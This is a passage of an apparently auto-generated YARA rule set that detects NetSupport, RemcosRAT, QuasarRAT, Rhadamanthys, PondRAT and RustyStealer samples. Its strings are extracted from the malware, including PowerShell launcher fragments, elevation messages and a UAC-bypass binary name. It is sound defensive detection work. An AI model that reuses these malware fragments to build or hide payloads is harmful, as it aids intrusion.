      $s3 = "T^_p K.iE.V O.lZA i.j_G.0.KWMfTpv.p.U.X_D)" fullword ascii /* score: '12.00'*/
      $s4 = "R.Z.M B%Cs% H)t?_fw_X_y^_F|_n_M:_B.z j* d].e b_GL m b.T y.p.Puf c.q_Z f.2n" fullword ascii /* score: '12.00'*/
      $s5 = "d C.8)_PX[> h.j1T- z.p.YC_Kx.A_SIN.tNxs.7.rp.IuFa.E.j.CQhr.2.m V@ HD.Zmx W.P: l" fullword ascii /* score: '11.00'*/
      $s6 = "Mi Y A.Npa T.j I.b.V.90_Z.w| D_T_K_lXA* XB_J O.x_C YP_OYUT.t K.l.G_P_G r_x W.lz.T$u.O f_h " fullword ascii /* score: '11.00'*/
      $s7 = "c Q_BJPV_f_P M q.D_p.2.V+|.1.2.i.S>U t n\\w U.k=_b.YMt W_a- t.F$ Q.p.Bh Hp_p@_R m_O_" fullword ascii /* score: '11.00'*/
      $s8 = "j C n* y_f_P_d N.7 u.A.b m.nqJ_y_A.U_j.SPL,.k_a H.p.spND,.3.XY.Z q_m.W1 s p B8_" fullword ascii /* score: '11.00'*/
      $s9 = "_Y.0.k.0_X kU.Jd`.y.GcCn:r_W.GAe.5.9+ vd_h.zT{_G_iX_M_f.vj_w." fullword ascii /* score: '11.00'*/
      $s10 = "- zc_M bV1.y_H.f_X C42OW<.t.X_Q.l_RK# X_H_g.qeXF P I F m_q K0 q.x s p_i).z.Te.G.WWA E+B on W.p_" fullword ascii /* score: '11.00'*/
      $s11 = ".0.xN m Z.rnQ B.Kk drsi j.PsK.v.N a* j F.c.e&_bb I.f{.hs m: b.5pL_" fullword ascii /* score: '11.00'*/
      $s12 = "Lf.D U.u%.l.93n.d F!_O.L- o.OfU.w.H_M wm8[.e.K.W ardy A_t~.l MK A4." fullword ascii /* score: '11.00'*/
      $s13 = "_l+ QJdl k.M Y};.jCS bN.1.G.b_e L_NX.V.h z W.cQ_I d.Y.e.L" fullword ascii /* score: '11.00'*/
      $s14 = "e T_i.w.2.Y>.X%G.X.7.l_ls.3`.jVXA.t d x`K.O2i3_p_r+ q S_hV.V)c$.bkq iB.O F7k" fullword ascii /* score: '11.00'*/
      $s15 = "l_V E.I.I_d b pp d V.wn_j_q fU.KeY C_f.mJ.J#,.n z_b_h.E?[jO dC L.e.ZXyn.A_f.S" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _NetSupport_signature__7b35c44b_NetSupport_signature__d76ad5e3_9 {
   meta:
      description = "_subset_batch - from files NetSupport(signature)_7b35c44b.msi, NetSupport(signature)_d76ad5e3.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7b35c44b77930bbd9945fccb6be71478471493810cdc9ae760e9a96de9b92955"
      hash2 = "d76ad5e35972da2fa2b65ea714d4bd45839b93f4c94cbaa59bf985203b7fe3d7"
   strings:
      $x1 = "ctory. A record parented to itself or with a Null parent represents a root of the install tree.Integer error number, obtained fr" ascii /* score: '48.00'*/
      $x2 = " [WindowsTypeNT50Display].ListViewBinary_MediaDiskIdLastSequenceDiskPromptCabinetVolumeLabel#disk1.cab_ValidationColumnNullableM" ascii /* score: '48.00'*/
      $x3 = ": [3].EXE and MSI file signature mismatch.EventMappingAttributeIgnoreChangeSetProgressProgressSelectionNoItemsEnabledSelectionDe" ascii /* score: '45.00'*/
      $x4 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* score: '35.00'*/
      $x5 = "Start-Transcript -Path \"$env:TEMP\\msi_ps_verbose.log\" -Force" fullword ascii /* score: '33.00'*/
      $x6 = ".ComboBoxFeature_LevelControlConditionControl_HideInstalled((NOT AI_INSTALL) AND (NOT AI_PATCH)) OR NOT AiReadmeLink((NOT AI_INS" ascii /* score: '31.00'*/
      $x7 = "cmdstub.exeInstallExecuteSequence(VersionNT >= 603)AI_NEWERPRODUCTFOUND AND (UILevel <> 5)NOT InstalledValidateProductIDAPPDIR=" ascii /* score: '31.00'*/
      $x8 = "PowerShellScriptLauncher.dll" fullword wide /* score: '31.00'*/
      $x9 = "--> PowerShell Script Execution log: " fullword wide /* score: '31.00'*/
      $s10 = "C:\\ReleaseAI\\win\\Release\\custact\\x86\\PowerShellScriptLauncher.pdb" fullword ascii /* score: '30.00'*/
      $s11 = "    $_.Exception | Out-File \"$env:TEMP\\msi_post_error.log\" -Append -Encoding UTF8" fullword ascii /* score: '30.00'*/
      $s12 = "  [\\[]string[\\]] $userScriptArgs = Get-Content $userScriptArgsFilePath" fullword ascii /* score: '28.00'*/
      $s13 = "C:\\ReleaseAI\\win\\Release\\bin\\x86\\embeddeduiproxy.pdb" fullword ascii /* score: '28.00'*/
      $s14 = "WriteEnvironmentStringsAdminExecuteSequenceInstallInitializeInstallFinalizeAdminUISequenceExecuteActionAI_SET_ADMINProgressDlgAd" ascii /* score: '28.00'*/
      $s15 = "--> PowerShell Script Execution Result Code: " fullword wide /* score: '28.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 21000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__755d5826_RemcosRAT_signature__836d22d2_RemcosRAT_signature__b099a49e_10 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_755d5826.js, RemcosRAT(signature)_836d22d2.js, RemcosRAT(signature)_b099a49e.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "755d58260755bf1f664a94b44c60c239c1e619ed2b1e7582b4ec15ccc88ac154"
      hash2 = "836d22d20f3fa6a5bd9a9708a56794f692df28393bb47ebfef3b597a1f7ee01a"
      hash3 = "b099a49e24f20a5a5583e8ccac5b88c90d2e03ed52e788d552d2ce03bb75a000"
   strings:
      $s1 = "//Systers nonstarch? salably unwaivering puget; temperamaleriers? paakrslen tindens129 phytosterol: sigtelinies, socialpdagogen " ascii /* score: '27.00'*/
      $s2 = "//Skriveskriftens stamkafyq pewy: pilgrimize. rafraichisseur, contradistinctly220: velsers salgsindsatsen provenient! hovedprogr" ascii /* score: '25.00'*/
      $s3 = "//skarnspanden; kateterets ballades? coumarin tbrudsskadens offer prettyism. withstand: efterkommelsesfristernes bisiliac nonapo" ascii /* score: '25.00'*/
      $s4 = "//Blendure, uskadelighedens; vrdipapircentralerne! byrom unvagrantly. chastines skrmmeddelelsers, roughishly penibel: gennemarbe" ascii /* score: '24.00'*/
      $s5 = "//Efteraarsfarvers, forladtheds indgriben laryngostenosis. chirurgical: forbrugerbevidst, eneid. smaskene rygerkupeens underprio" ascii /* score: '23.00'*/
      $s6 = "//Pkge kunstnerens, klatret! pipy? dykkede paganalian228 albylernes193! hnsefoder? myndes. grants tricentennials elevates gests:" ascii /* score: '21.00'*/
      $s7 = "kiske? compassionated computerproduktionerne karyoplasmic delingsplan. damasker austrianize modellen47 postinfective sandiver204" ascii /* score: '20.00'*/
      $s8 = "//Mikaellas? reechoes: spurvs pirlie beskringer! blameret43! wolfian tringens! stenotypy rugdrys184 metrician egennavnets: calca" ascii /* score: '20.00'*/
      $s9 = "auts relationsoperatorens gravmlets; socialstyrelse isospondyli! afsendelsesprioriteringers skruebrkker bypass! jarnes driftssik" ascii /* score: '20.00'*/
      $s10 = "//Fortoldningens, spredningsmeteorologiskes; armpad9. hospitalize arveafgiftsberegningens raekkeudvikling programmelkonstruktion" ascii /* score: '20.00'*/
      $s11 = "//Havnefoged knaset sufflering: arugula skjulere? triradially; underarm derindad159 slgerpantebrevene145 nonanticipative circumn" ascii /* score: '20.00'*/
      $s12 = "neoplantar grundlaget skemas ungeological stabilisatorers? pretreating! kildeskrift: fastkurs payess dagtemperatur knejpers tabe" ascii /* score: '20.00'*/
      $s13 = "//bemidlede; handkerchiefs: suggestivt. mana69 styringskort; kemofiber249! statsmagters! infraoral203? beskrersakse! acronymize," ascii /* score: '20.00'*/
      $s14 = "//Udstrningers! attemptability logget? proselyter essayers! amphicarpium, vokalisering? unsimulative garroted241, morigerously10" ascii /* score: '20.00'*/
      $s15 = "//Omophagist samkvemsmuligheds overtrukne plantago? demagogen. anneksionernes ridderslaget. tildannelserne, raglanite shoulderer" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__11 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature).exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ecdbbca2a2effae3bf609643a3f9f321de8b1b1c357d2db921a0de777fa06023"
      hash2 = "cae151fa658bb748d0df462d04cf0aa1b6f06c25de363fa0c6080369c0c2aa97"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s2 = "6563757269747953616665437269746963616C4174747269627574650053797374656D2E5365637572697479006765745F4974656D73007365745F53656C6563" ascii /* score: '24.00'*/ /* hex encoded string 'ecuritySafeCriticalAttributeSystem.Securityget_Itemsset_Selec' */
      $s3 = "6563742E646C6C004265657250756250726F6A656374006D73636F726C69620053797374656D2E57696E646F77732E466F726D730053797374656D0053797374" ascii /* score: '24.00'*/ /* hex encoded string 'ect.dllBeerPubProjectmscorlibSystem.Windows.FormsSystemSyst' */
      $s4 = "7874426F784261736500494175746F6D6174696F6E4C697665526567696F6E0053797374656D2E57696E646F77732E466F726D732E4175746F6D6174696F6E00" ascii /* score: '24.00'*/ /* hex encoded string 'xtBoxBaseIAutomationLiveRegionSystem.Windows.Forms.Automation' */
      $s5 = "656D2E44726177696E670053797374656D2E44617461003C4D6F64756C653E00436861720052756E74696D6548656C706572730053797374656D2E52756E7469" ascii /* score: '24.00'*/ /* hex encoded string 'em.DrawingSystem.Data<Module>CharRuntimeHelpersSystem.Runti' */
      $s6 = "74696F6E0053797374656D2E446174612E53716C436C69656E740053716C436F6D6D616E64004462436F6D6D616E6400457863657074696F6E00436C6F736500" ascii /* score: '24.00'*/ /* hex encoded string 'tionSystem.Data.SqlClientSqlCommandDbCommandExceptionClose' */
      $s7 = "696573466C61677300446174614D6973616C69676E6564004469726563746F7279496E666F004C69737460310053797374656D2E436F6C6C656374696F6E732E" ascii /* score: '24.00'*/ /* hex encoded string 'iesFlagsDataMisalignedDirectoryInfoList`1System.Collections.' */
      $s8 = "49427574746F6E436F6E74726F6C00506F696E740053697A65004576656E7448616E646C657200427574746F6E4261736500436F6E74726F6C436F6C6C656374" ascii /* score: '24.00'*/ /* hex encoded string 'IButtonControlPointSizeEventHandlerButtonBaseControlCollect' */
      $s9 = "6C65746542656572496E444200626565724E616D6500457865637574654E6F6E5175657279004765745479706573004765744D6574686F647300417070656E64" ascii /* score: '24.00'*/ /* hex encoded string 'leteBeerInDBbeerNameExecuteNonQueryGetTypesGetMethodsAppend' */
      $s10 = "47656E6572696300456E756D657261746F720049436F6D70617261626C65004C697374426F78004F626A656374436F6C6C656374696F6E00436C65617200536F" ascii /* score: '24.00'*/ /* hex encoded string 'GenericEnumeratorIComparableListBoxObjectCollectionClearSo' */
      $s11 = "65007631007632006765745F436F756E7400426573744275790046696E64436865617065737442656572006765745F5075624E616D65007365745F5075624E61" ascii /* score: '24.00'*/ /* hex encoded string 'ev1v2get_CountBestBuyFindCheapestBeerget_PubNameset_PubNa' */
      $s12 = "7373656D626C79436F6D70616E7941747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967" ascii /* score: '24.00'*/ /* hex encoded string 'ssemblyCompanyAttributeAssemblyProductAttributeAssemblyCopyrig' */
      $s13 = "614164617074657200496E7465726E616C44617461436F6C6C656374696F6E426173650049456E756D657261746F72004D657373616765426F780053686F7700" ascii /* score: '24.00'*/ /* hex encoded string 'aAdapterInternalDataCollectionBaseIEnumeratorMessageBoxShow' */
      $s14 = "726967696E616C4269746D6170006D6F6469666965644269746D6170006164646564576964746800616464656448656967687400646973706F73696E67005465" ascii /* score: '24.00'*/ /* hex encoded string 'riginalBitmapmodifiedBitmapaddedWidthaddedHeightdisposingTe' */
      $s15 = "705F457175616C697479006765745F53656C65637465644974656D006765745F54657874005468726561640053797374656D2E546872656164696E6700536C65" ascii /* score: '24.00'*/ /* hex encoded string 'p_Equalityget_SelectedItemget_TextThreadSystem.ThreadingSle' */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _NetSupport_signature__NetSupport_signature__d39c9278_12 {
   meta:
      description = "_subset_batch - from files NetSupport(signature).msi, NetSupport(signature)_d39c9278.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8afb4dcd3574e5a716e75a77a1ccdf9e23e6a03e181aa6a3ecb9b9d38e9aa039"
      hash2 = "d39c9278a6f915e3d87e4bdf4bbd820a3fad7b31b696bb05367347541549caa5"
   strings:
      $x1 = "(This operation cannot be undone.)Error writing to file: [2].  Verify that you have access to that directory.Installer stopped p" ascii /* score: '81.00'*/
      $x2 = "[2]Error converting file time to local time for file: [3]. GetLastError: [2].Path: [2] is not a parent of [3].On the dialog [2] " ascii /* score: '72.00'*/
      $x3 = "Your original Firewall configuration will be restored.Invalid Firewall network scope: [2].There was an error registering port wi" ascii /* score: '34.00'*/
      $s4 = "le server. The required file 'CABINET.DLL' may be missing.Database: [2]. Insufficient parameters for Execute.Database: [2]. Curs" ascii /* score: '29.00'*/
      $s5 = " was an error during the SQL script execution process.ODBC Error: [2] ([3]).SQL script parse error: invalid syntax.Internal erro" ascii /* score: '29.00'*/
      $s6 = "e control [3] on the dialog [2].Creating the [2] table failed.Creating a cursor to the [2] table failed.Executing the [2] view f" ascii /* score: '28.00'*/
      $s7 = "figured properly and try the install again.Executing action [2] failed.User '[2]' has previously initiated an install for produc" ascii /* score: '26.00'*/
      $s8 = "] script error [3], [4]: [5] Line [6], Column [7], [8].Could not execute custom action [2], location: [3], command: [4].Transfor" ascii /* score: '26.00'*/
      $s9 = "You need Internet Information Services 5.0 or above.Could not get file time for file: [3] GetLastError: [2].Error in FileToDosDa" ascii /* score: '25.00'*/
      $s10 = "].}}Attempted to initialize an already initialized handler.Shortcuts not supported by the operating system.Invalid .INI action: " ascii /* score: '25.00'*/
      $s11 = "Do you want to skip this package and continue the installation ?Unable to remove user account or group '[2]' on the local machin" ascii /* score: '25.00'*/
      $s12 = "OR REINSTALLAI_UPGRADE=\"No\" AND (Not Installed)NOT InstalledVersionNTInstallExecuteAI_USE_STD_ODBC_MGRIsolateComponentsRedirec" ascii /* score: '24.00'*/
      $s13 = "exeTCCTL32.DLL_ValidationColumnNullableMinValueMaxValueKeyTableKeyColumnCategorySetDescriptionActionTextNIdentifierName of actio" ascii /* score: '24.00'*/
      $s14 = " been truncated.Loading RICHED20.DLL failed. GetLastError() returned: [2].Freeing RICHED20.DLL failed. GetLastError() returned: " ascii /* score: '23.00'*/
      $s15 = "[2].Failed to create any [2] font on this system.For [2] textstyle, the system created a '[3]' font, in [4] character set.Operat" ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PondRAT_signature__POOLRAT_signature__Rhadamanthys_signature__308f67a5f891daad126b73e042f69532_imphash__13 {
   meta:
      description = "_subset_batch - from files PondRAT(signature).elf, POOLRAT(signature).elf, Rhadamanthys(signature)_308f67a5f891daad126b73e042f69532(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "973f7939ea03fd2c9663dafc21bb968f56ed1b9a56b0284acf73c3ee141c053c"
      hash2 = "85045d9898d28c9cdc4ed0ca5d76eceb457d741c5ca84bb753dde1bea980b516"
      hash3 = "4e88e97019fa8f35358f01b9938a7cfa84bafd15cc8f029158817b3737e6fd98"
   strings:
      $s1 = "process_pci_value" fullword ascii /* score: '15.00'*/
      $s2 = "v2i_EXTENDED_KEY_USAGE" fullword ascii /* score: '12.00'*/
      $s3 = "evp_EncryptDecryptUpdate" fullword ascii /* score: '11.00'*/
      $s4 = "asn1_template_ex_i2d" fullword ascii /* score: '11.00'*/
      $s5 = "asn1_template_ex_d2i" fullword ascii /* score: '11.00'*/
      $s6 = " JJ5Jj" fullword ascii /* reversed goodware string 'jJ5JJ ' */ /* score: '11.00'*/
      $s7 = "asn1_template_noexp_d2i" fullword ascii /* score: '11.00'*/
      $s8 = "i2v_AUTHORITY_KEYID" fullword ascii /* score: '10.00'*/
      $s9 = "v2i_AUTHORITY_KEYID" fullword ascii /* score: '10.00'*/
      $s10 = " ' ) - 3 G M Q _ c e i w } " fullword ascii /* score: '9.00'*/
      $s11 = "eckey_pub_decode" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 16000KB and pe.imphash() == "308f67a5f891daad126b73e042f69532" and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__907526c3_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_14 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_907526c3.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ea90d10a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "907526c3c3900f327899c251e01e0bd5678774fc163f0c053eec4cbe1ea5e8b2"
      hash2 = "ea90d10a0f856d00da2e68829e7c87e04f0d4834a05405cdbda1455c05f7de0f"
   strings:
      $x1 = "costura.system.threading.tasks.extensions.dll.compressed|4.2.0.1|System.Threading.Tasks.Extensions, Version=4.2.0.1, Culture=neu" ascii /* score: '44.00'*/
      $x2 = "costura.system.collections.immutable.dll.compressed|8.0.0.0|System.Collections.Immutable, Version=8.0.0.0, Culture=neutral, Publ" ascii /* score: '44.00'*/
      $x3 = "costura.messagepack.annotations.dll.compressed|3.1.4.0|MessagePack.Annotations, Version=3.1.4.0, Culture=neutral, PublicKeyToken" ascii /* score: '41.00'*/
      $x4 = "costura.messagepack.dll.compressed|3.1.4.0|MessagePack, Version=3.1.4.0, Culture=neutral, PublicKeyToken=b4a0369545f0a1be|Messag" ascii /* score: '41.00'*/
      $x5 = "costura.messagepack.annotations.dll.compressed|3.1.4.0|MessagePack.Annotations, Version=3.1.4.0, Culture=neutral, PublicKeyToken" ascii /* score: '39.00'*/
      $x6 = "costura.messagepack.dll.compressed|3.1.4.0|MessagePack, Version=3.1.4.0, Culture=neutral, PublicKeyToken=b4a0369545f0a1be|Messag" ascii /* score: '39.00'*/
      $x7 = "costura.system.collections.immutable.dll.compressed|8.0.0.0|System.Collections.Immutable, Version=8.0.0.0, Culture=neutral, Publ" ascii /* score: '33.00'*/
      $x8 = "costura.system.threading.tasks.extensions.dll.compressed|4.2.0.1|System.Threading.Tasks.Extensions, Version=4.2.0.1, Culture=neu" ascii /* score: '33.00'*/
      $s9 = "tral, PublicKeyToken=cc7b13ffcd2ddd51|System.Threading.Tasks.Extensions.dll|2242627282F9E07E37B274EA36FAC2D3CD9C9110|25984" fullword ascii /* score: '30.00'*/
      $s10 = "icKeyToken=b03f5f7f11d50a3a|System.Collections.Immutable.dll|6E3CCF50BB1D30805DCE58AB6BDD63E0196669E6|252696" fullword ascii /* score: '27.00'*/
      $s11 = "costura.system.threading.tasks.extensions.dll.compressed" fullword wide /* score: '25.00'*/
      $s12 = "computerdefaults.exe" fullword wide /* score: '25.00'*/
      $s13 = "costura.messagepack.annotations.dll.compressed" fullword wide /* score: '22.00'*/
      $s14 = "costura.messagepack.dll.compressed" fullword wide /* score: '22.00'*/
      $s15 = "ePack.dll|B57B485BA7372FB3403FD0C36043A051AF2AFC05|377344" fullword ascii /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _NetSupport_signature__NetSupport_signature__7b35c44b_NetSupport_signature__d39c9278_NetSupport_signature__d76ad5e3_15 {
   meta:
      description = "_subset_batch - from files NetSupport(signature).msi, NetSupport(signature)_7b35c44b.msi, NetSupport(signature)_d39c9278.msi, NetSupport(signature)_d76ad5e3.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8afb4dcd3574e5a716e75a77a1ccdf9e23e6a03e181aa6a3ecb9b9d38e9aa039"
      hash2 = "7b35c44b77930bbd9945fccb6be71478471493810cdc9ae760e9a96de9b92955"
      hash3 = "d39c9278a6f915e3d87e4bdf4bbd820a3fad7b31b696bb05367347541549caa5"
      hash4 = "d76ad5e35972da2fa2b65ea714d4bd45839b93f4c94cbaa59bf985203b7fe3d7"
   strings:
      $x1 = "%s\\System32\\cmd.exe" fullword wide /* score: '32.00'*/
      $x2 = "[SystemFolder]msiexec.exe" fullword wide /* score: '32.00'*/
      $s3 = "WindowsAzureGuestAgent.exe" fullword wide /* score: '27.00'*/
      $s4 = "Microsoft Shared\\Web Server Extensions\\%d\\BIN\\STSADM.EXE" fullword wide /* score: '26.00'*/
      $s5 = "Failed to check internet connection through INetworkListManager::get_IsConnectedToInternet !!!" fullword wide /* score: '24.00'*/
      $s6 = "<!-- Generator: Adobe Illustrator 25.2.3, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->" fullword ascii /* score: '23.00'*/
      $s7 = "aicustact.dll" fullword ascii /* score: '23.00'*/
      $s8 = "SoftwareDetector.dll" fullword wide /* score: '23.00'*/
      $s9 = "Execute operation:" fullword wide /* score: '23.00'*/
      $s10 = "NetUserModalsGet will use empty target computer name." fullword wide /* score: '23.00'*/
      $s11 = "AICustAct.dll" fullword wide /* score: '23.00'*/
      $s12 = "[SystemFolder]\\wininet.dll" fullword wide /* score: '23.00'*/
      $s13 = "[SystemFolder]d3d12.dll" fullword wide /* score: '23.00'*/
      $s14 = "[SystemFolder]d3d11.dll" fullword wide /* score: '23.00'*/
      $s15 = "[SystemFolder]d3d10.dll" fullword wide /* score: '23.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 21000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PDQConnect_signature__PDQConnect_signature__034b202c_PDQConnect_signature__0e8469dd_PDQConnect_signature__2feb6905_PDQConne_16 {
   meta:
      description = "_subset_batch - from files PDQConnect(signature).msi, PDQConnect(signature)_034b202c.msi, PDQConnect(signature)_0e8469dd.msi, PDQConnect(signature)_2feb6905.msi, PDQConnect(signature)_362aa6b0.msi, PDQConnect(signature)_4b6f0197.msi, PDQConnect(signature)_7b7fcfa3.msi, PDQConnect(signature)_7f6dad75.msi, PDQConnect(signature)_821d2c62.msi, PDQConnect(signature)_8e9f898c.msi, PDQConnect(signature)_b2011d6e.msi, PDQConnect(signature)_da0e4be3.msi, PDQConnect(signature)_eabaddc7.msi, PDQConnect(signature)_fa76da7d.msi, RustyStealer(signature).msi, RustyStealer(signature)_3cd64360.msi, RustyStealer(signature)_75d13124.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9c8d6f1ee1180ae2f6982582980b67ad4fe2a20fc8b45308975d1e31c7f99191"
      hash2 = "034b202cf33146a9037957e3165b4921384727a70006b6abf385b9506de8ad06"
      hash3 = "0e8469dd70f63dc392676f862d2c02c24e7d53aa2cff42fe471eaaa0c17eecf8"
      hash4 = "2feb6905303bee7478366f382b23ea272fd44833d7a7ab3ebc3312a381bc4fb0"
      hash5 = "362aa6b01f3cd9296e70980b1d93ba39de7ee4749b4885a7f6a8d87ad5d1ff33"
      hash6 = "4b6f01972a90e8e7bc39e4d5cf9a88fb93adcb3daae39be45975e2b1089a1552"
      hash7 = "7b7fcfa3f52d6582e6dd278f2079c3158906529db5407e648e8990f095a05383"
      hash8 = "7f6dad75615565376cb447044fc93c9a9975d0e94a28a2042cbcb03f90a3accb"
      hash9 = "821d2c62055f6164560a7edeaf7e67d240f050fb112cddf25725838a3e28c037"
      hash10 = "8e9f898c5baac69c96da4accccae6df725a1e88ca23f5dc59f03496778442671"
      hash11 = "b2011d6e78c449de79b9302fd3417b0053fe0a5359b2b733dfedb0451da2d3d7"
      hash12 = "da0e4be31458c29e7c4af566c2ffe2882b69379c3144a8d71a42ad6e44a0ed61"
      hash13 = "eabaddc7d4d37284ddb8c3a764324626eca121747ed9647349c35ab19908fbd2"
      hash14 = "fa76da7d823f2f36aaec9988d52cdc7b78c9f076efcfc5d2b2c76a6141ab2822"
      hash15 = "136a6b11b37e77af53a1248e099999cbbb4530fafe17d2cc157c75d3b639546e"
      hash16 = "3cd643601fa45658b21139debe530883524d53d2923554a4b547dd531d019b30"
      hash17 = "75d131243082e546c1083b3876c84c71251fa483fc5b098765d643ab71ed82df"
   strings:
      $x1 = "Failed to get elevation token from process." fullword ascii /* score: '38.00'*/
      $x2 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */ /* score: '33.00'*/
      $s3 = "failed to get WixUnelevatedShellExecTarget" fullword ascii /* score: '30.00'*/
      $s4 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s5 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s6 = "ShelExecUnelevated failed with target %ls" fullword ascii /* score: '28.00'*/
      $s7 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s8 = "Skipping ConfigurePerfmonManifestUnregister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s9 = "Skipping ConfigureEventManifestUnregister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s10 = "Skipping ConfigurePerfmonManifestRegister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s11 = "Skipping ConfigureEventManifestRegister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s12 = "Failed to get the RmEndSession procedure from rstrtmgr.dll." fullword ascii /* score: '27.00'*/
      $s13 = "WixUnelevatedShellExecTarget is %ls" fullword ascii /* score: '27.00'*/
      $s14 = "Failed to get the RmJoinSession procedure from rstrtmgr.dll." fullword ascii /* score: '27.00'*/
      $s15 = "WixUnelevatedShellExecTarget" fullword wide /* score: '27.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__185128c7_RemcosRAT_signature__7dfb1a72_RemcosRAT_signature__e185a83d_17 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_185128c7.js, RemcosRAT(signature)_7dfb1a72.js, RemcosRAT(signature)_e185a83d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "185128c76cd8a2f3b2f16d1f5d7915ea468287c94fff4720f5a95762088888ed"
      hash2 = "7dfb1a72a48d4007d700b11fb14da6586b296544918b9c1d1894dbd36231df2c"
      hash3 = "e185a83d49e25dddf051b992f21206f8502adc422730ed825ce1d84dbece947b"
   strings:
      $s1 = "//Koggerne spildevandstilladelsens moebler dumpekaraktererne: phytosociologist." fullword ascii /* score: '19.00'*/
      $s2 = "//Surveyed? ssterselskabs; extempory" fullword ascii /* score: '16.00'*/
      $s3 = "//Brunelles hypsometer! reube183; fluorinated commandrie:" fullword ascii /* score: '15.00'*/
      $s4 = "//Filmforestillingerne. circumscriptly; kapur luminophor:" fullword ascii /* score: '15.00'*/
      $s5 = "//Elevatorskakts antineutral: theologizer scension! ungorge" fullword ascii /* score: '14.00'*/
      $s6 = "//Saanings moveably! logget tontinernes:" fullword ascii /* score: '14.00'*/
      $s7 = "//Accounted finansselskab? tilvirkedes tempters hderligheders" fullword ascii /* score: '14.00'*/
      $s8 = "//Indfjnings119 krediteringens valget: katalogisvbr" fullword ascii /* score: '14.00'*/
      $s9 = "//Hypostatises: translatr. yomas114 bismervgtene keyserlick" fullword ascii /* score: '12.00'*/
      $s10 = "Aspirationskeurb = Aspirationskeurb - 5464054;" fullword ascii /* score: '12.00'*/
      $s11 = "//Trilogic? outbanning becomes badenes urethralgia:" fullword ascii /* score: '12.00'*/
      $s12 = "//Pudderne tenorfljters? computerteknologien?" fullword ascii /* score: '12.00'*/
      $s13 = "//Hawkeye! romancelet," fullword ascii /* score: '12.00'*/
      $s14 = "//Integrating abnormalizes240; diamantoid wickiups192? shellycoat" fullword ascii /* score: '12.00'*/
      $s15 = "//Forstaaelsesrammerne templars juniores fetisher" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0__18 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
